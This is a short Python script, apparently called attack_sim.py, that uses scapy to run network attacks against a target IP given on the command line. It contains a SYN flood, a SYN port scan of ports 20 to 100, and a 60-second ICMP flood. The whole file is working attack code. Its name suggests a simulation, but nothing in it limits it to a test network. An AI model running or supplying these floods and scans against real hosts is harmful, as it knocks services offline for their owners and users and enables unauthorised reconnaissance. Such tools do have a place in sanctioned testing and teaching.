import sys
import time
import random
from scapy.all import *

def syn_flood(target_ip, target_port, duration):
    print(f"[*] Starting SYN Flood on {target_ip}:{target_port} for {duration}s...")
    timeout = time.time() + duration
    sent = 0
    while time.time() < timeout:
        sport = random.randint(1024, 65535)
        ip_p = IP(dst=target_ip)
        tcp_p = TCP(sport=sport, dport=target_port, flags="S")
        send(ip_p/tcp_p, verbose=False)
        sent += 1
    print(f"[+] Sent {sent} packets.")

def port_scan(target_ip, start_port, end_port):
    print(f"[*] Scanning {target_ip} from {start_port} to {end_port}...")
    for port in range(start_port, end_port + 1):
        ip_p = IP(dst=target_ip)
        tcp_p = TCP(dport=port, flags="S")
        resp = sr1(ip_p/tcp_p, timeout=0.1, verbose=False)
        if resp and resp.haslayer(TCP) and resp.getlayer(TCP).flags == 0x12:
            print(f"  [!] Port {port} is OPEN")
            send(IP(dst=target_ip)/TCP(dport=port, flags="R"), verbose=False)

def icmp_flood(target_ip, duration):
    print(f"[*] Starting ICMP Flood on {target_ip} for {duration}s...")
    timeout = time.time() + duration
    while time.time() < timeout:
        send(IP(dst=target_ip)/ICMP(), verbose=False)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 attack_sim.py <target_ip> <attack_type> [port]")
        print("Types: syn, scan, icmp")
        sys.exit(1)

    target = sys.argv[1]
    atk_type = sys.argv[2]

    if atk_type == "syn":
        port = int(sys.argv[3]) if len(sys.argv) > 3 else 80
        syn_flood(target, port, 10)
    elif atk_type == "scan":
        port_scan(target, 20, 100)
    elif atk_type == "icmp" or atk_type == "flood":
        icmp_flood(target, 60)
    else:
        print("Unknown attack type.")
